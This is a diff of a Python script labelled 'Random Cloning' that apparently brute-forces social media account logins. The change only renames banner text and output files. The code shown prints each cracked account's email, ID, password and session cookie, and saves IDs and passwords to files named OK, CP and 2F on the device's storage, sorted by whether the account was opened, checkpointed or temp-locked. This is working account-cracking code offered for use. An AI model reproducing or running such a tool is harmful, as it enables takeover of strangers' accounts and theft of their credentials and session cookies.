@@ -70,12 +70,13 @@ twf = []
 def clear():
     os.system('clear')
     print(logo)                                        
-logo =f"""____________________
+logo =f"""
     __  ______    __  _____  ___   __     _  __
    /  |/  /   |  /  |/  / / / / | / /    | |/ /
   / /|_/ / /| | / /|_/ / / / /  |/ /_____|   / 
  / /  / / ___ |/ /  / / /_/ / /|  /_____/   |  
 /_/  /_/_/  |_/_/  /_/\____/_/ |_/     /_/|_|
+
 AUTHOR    : M A M U N
 Whatsapp  : 01304906886
 Status    : Random Cloning
@@ -239,15 +240,15 @@ def free(uid,pwx,tl):
                 cid = coki[7:22]
                 print('\r\033[1;32m[√]---------------------[MX-OK]--------------------[√]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\nCOOKIE   : '+coki+'\n[√]---------------------------------------------------[√]')
                 cek_apk(session,coki)
-                open('/sdcard/MAMUN-OK.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/MX-OK.txt', 'a').write(cid+' | '+ps+'\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid=coki[24:39]
                 Red = '\033[1;31m'
-                print(f'\r{Red}[×]--------------------[JADU-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
-                open('/sdcard/MAMUN-CP.txt', 'a').write(cid+' | '+ps+'\n')
+                print(f'\r{Red}[×]--------------------[MX-CP]---------------------[×]\nEMAIL : '+uid+'\nUID   : '+cid+' √ '+ps+ '\n[×]---------------------------------------------------[×]\033[1;97m')
+                open('/sdcard/MX-CP.txt', 'a').write(cid+' | '+ps+'\n')
                 cps.append(cid)
                 break
             elif '/x/checkpoint' in log_cookies:
@@ -255,12 +256,12 @@ def free(uid,pwx,tl):
                 cid=coki[7:22]
                 Red = '\033[1;31m'
                 print(f'\r{YELLOW}[TEMP-LOCK] '+cid+' | '+ps+'\033[1;97m')
-                open('/sdcard/MAMUN-2F.txt', 'a').write(cid+' | '+ps+'\n')
+                open('/sdcard/MX-2F.txt', 'a').write(cid+' | '+ps+'\n')
                 twf.append(cid)
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r\33[1;37m[JADUGAR] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
+        sys.stdout.write(f'\r\33[1;37m[MX] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
         sys.stdout.flush()
         checks(oks,cps,twf)
     except:
